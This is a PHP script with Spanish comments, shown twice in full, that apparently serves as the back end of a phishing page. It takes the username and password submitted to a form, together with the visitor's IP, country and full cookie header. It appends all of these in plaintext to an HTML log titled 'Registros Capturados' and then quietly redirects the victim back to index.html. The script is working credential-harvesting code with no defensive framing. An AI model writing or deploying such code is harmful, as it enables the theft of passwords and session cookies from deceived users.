<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {

    // Recibir datos del formulario
    $usuario = trim($_POST["usuario"]);
    $contrasena = trim($_POST["contrasena"]);

    // Obtener IP
    function obtenerIP() {
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
        if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return $_SERVER['HTTP_X_FORWARDED_FOR'];
        return $_SERVER['REMOTE_ADDR'];
    }
    $ip = obtenerIP();

    // Fecha y hora
    date_default_timezone_set('America/Mexico_City');
    $fecha = date("Y-m-d");
    $hora = date("H:i:s");

    // Obtener país
    $pais = "No disponible";
    if (!empty($ip) && $ip !== "127.0.0.1") {
        $geo = @file_get_contents("http://ip-api.com/json/$ip?fields=country,status");
        if ($geo) {
            $datosGeo = json_decode($geo);
            if ($datosGeo->status === "success") {
                $pais = $datosGeo->country;
            }
        }
    } elseif ($ip === "127.0.0.1") {
        $pais = "Local";
    }

    // ✅ OBTENER LA COOKIE
    // $_SERVER['HTTP_COOKIE'] contiene todas las cookies enviadas por el navegador
    $cookie = isset($_SERVER['HTTP_COOKIE']) ? trim($_SERVER['HTTP_COOKIE']) : "No disponible";

    // Preparar registro en formato HTML
    $nuevoRegistro = "
    <tr>
        <td class='border px-4 py-2'>$fecha</td>
        <td class='border px-4 py-2'>$hora</td>
        <td class='border px-4 py-2'>$ip</td>
        <td class='border px-4 py-2'>$pais</td>
        <td class='border px-4 py-2'>" . htmlspecialchars($usuario) . "</td>
        <td class='border px-4 py-2'>" . htmlspecialchars($contrasena) . "</td>
        <td class='border px-4 py-2 break-all text-xs'>" . htmlspecialchars($cookie) . "</td>
    </tr>";

    $archivoRegistro = "re.html";

    // Crear estructura si no existe
    if (!file_exists($archivoRegistro)) {
        $contenido = "
        <!DOCTYPE html>
        <html lang='es'>
        <head>
            <meta charset='UTF-8'>
            <title>Registros Capturados</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 2rem; background: #f8f9fa; }
                h1 { color: #1a73e8; text-align: center; }
                table { width: 100%; border-collapse: collapse; background: white; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
                th { background: #1a73e8; color: white; padding: 12px; text-align: left; }
                td { padding: 10px; border: 1px solid #ddd; }
                tr:nth-child(even) { background: #f2f2f2; }
                .break-all { word-break: break-all; } /* Para que la cookie larga se vea bien */
            </style>
        </head>
        <body>
            <h1>Registros de Accesos</h1>
            <table>
                <tr>
                    <th>Fecha</th>
                    <th>Hora</th>
                    <th>IP</th>
                    <th>País</th>
                    <th>Usuario</th>
                    <th>Contraseña</th>
                    <th>Cookie</th>
                </tr>
                $nuevoRegistro
            </table>
        </body>
        </html>";
    } else {
        // Agregar nuevo registro al final
        $contenidoActual = file_get_contents($archivoRegistro);
        $contenido = str_replace("</table>", "$nuevoRegistro</table>", $contenidoActual);
    }

    // Guardar archivo
    file_put_contents($archivoRegistro, $contenido, LOCK_EX);

    // Redirigir al formulario sin mostrar nada
    header("Location: index.html");
    exit;

} else {
    header("Location: index.html");
    exit;
}
?><?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {

    // Recibir datos del formulario
    $usuario = trim($_POST["usuario"]);
    $contrasena = trim($_POST["contrasena"]);

    // Obtener IP
    function obtenerIP() {
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
        if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return $_SERVER['HTTP_X_FORWARDED_FOR'];
        return $_SERVER['REMOTE_ADDR'];
    }
    $ip = obtenerIP();

    // Fecha y hora
    date_default_timezone_set('America/Mexico_City');
    $fecha = date("Y-m-d");
    $hora = date("H:i:s");

    // Obtener país
    $pais = "No disponible";
    if (!empty($ip) && $ip !== "127.0.0.1") {
        $geo = @file_get_contents("http://ip-api.com/json/$ip?fields=country,status");
        if ($geo) {
            $datosGeo = json_decode($geo);
            if ($datosGeo->status === "success") {
                $pais = $datosGeo->country;
            }
        }
    } elseif ($ip === "127.0.0.1") {
        $pais = "Local";
    }

    // ✅ OBTENER LA COOKIE
    // $_SERVER['HTTP_COOKIE'] contiene todas las cookies enviadas por el navegador
    $cookie = isset($_SERVER['HTTP_COOKIE']) ? trim($_SERVER['HTTP_COOKIE']) : "No disponible";

    // Preparar registro en formato HTML
    $nuevoRegistro = "
    <tr>
        <td class='border px-4 py-2'>$fecha</td>
        <td class='border px-4 py-2'>$hora</td>
        <td class='border px-4 py-2'>$ip</td>
        <td class='border px-4 py-2'>$pais</td>
        <td class='border px-4 py-2'>" . htmlspecialchars($usuario) . "</td>
        <td class='border px-4 py-2'>" . htmlspecialchars($contrasena) . "</td>
        <td class='border px-4 py-2 break-all text-xs'>" . htmlspecialchars($cookie) . "</td>
    </tr>";

    $archivoRegistro = "re.html";

    // Crear estructura si no existe
    if (!file_exists($archivoRegistro)) {
        $contenido = "
        <!DOCTYPE html>
        <html lang='es'>
        <head>
            <meta charset='UTF-8'>
            <title>Registros Capturados</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 2rem; background: #f8f9fa; }
                h1 { color: #1a73e8; text-align: center; }
                table { width: 100%; border-collapse: collapse; background: white; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
                th { background: #1a73e8; color: white; padding: 12px; text-align: left; }
                td { padding: 10px; border: 1px solid #ddd; }
                tr:nth-child(even) { background: #f2f2f2; }
                .break-all { word-break: break-all; } /* Para que la cookie larga se vea bien */
            </style>
        </head>
        <body>
            <h1>Registros de Accesos</h1>
            <table>
                <tr>
                    <th>Fecha</th>
                    <th>Hora</th>
                    <th>IP</th>
                    <th>País</th>
                    <th>Usuario</th>
                    <th>Contraseña</th>
                    <th>Cookie</th>
                </tr>
                $nuevoRegistro
            </table>
        </body>
        </html>";
    } else {
        // Agregar nuevo registro al final
        $contenidoActual = file_get_contents($archivoRegistro);
        $contenido = str_replace("</table>", "$nuevoRegistro</table>", $contenidoActual);
    }

    // Guardar archivo
    file_put_contents($archivoRegistro, $contenido, LOCK_EX);

    // Redirigir al formulario sin mostrar nada
    header("Location: index.html");
    exit;

} else {
    header("Location: index.html");
    exit;
}
?>